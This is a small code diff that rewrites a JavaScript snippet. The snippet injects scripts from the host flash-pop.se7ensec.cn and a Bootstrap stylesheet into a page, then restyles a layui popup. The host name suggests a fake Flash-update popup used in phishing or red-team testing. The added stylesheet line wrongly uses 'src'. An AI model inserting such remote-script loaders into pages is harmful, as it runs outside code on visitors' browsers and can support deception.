@@ -1,12 +1,16 @@
-s1 = document.createElement('script');
-s1.src = 'https://flash-pop.se7ensec.cn/layer/jquery.min.js';
-document.body.appendChild(s1);
-s2 = document.createElement('script');
-s2.src = 'https://flash-pop.se7ensec.cn/layer/layer.js';
-document.body.appendChild(s2);
-s3 = document.createElement('link');
-s3.href = 'https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css';
-document.body.appendChild(s3);
+var s1 = document.createElement('script');
+s1.setAttribute('src','//flash-pop.se7ensec.cn/layer/jquery.min.js');
+
+var s2 = document.createElement('script');
+s2.setAttribute('src','//flash-pop.se7ensec.cn/layer/layer.js');
+
+var s3 = document.createElement('link');
+s3.setAttribute('src','//cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css');
+
+var head = document.getElementsByTagName('head')[0];
+head.appendChild(s1);
+head.appendChild(s2);
+head.appendChild(s3);
 
         window.onload = () => {
             $(".layui-layer").css("background", "none");
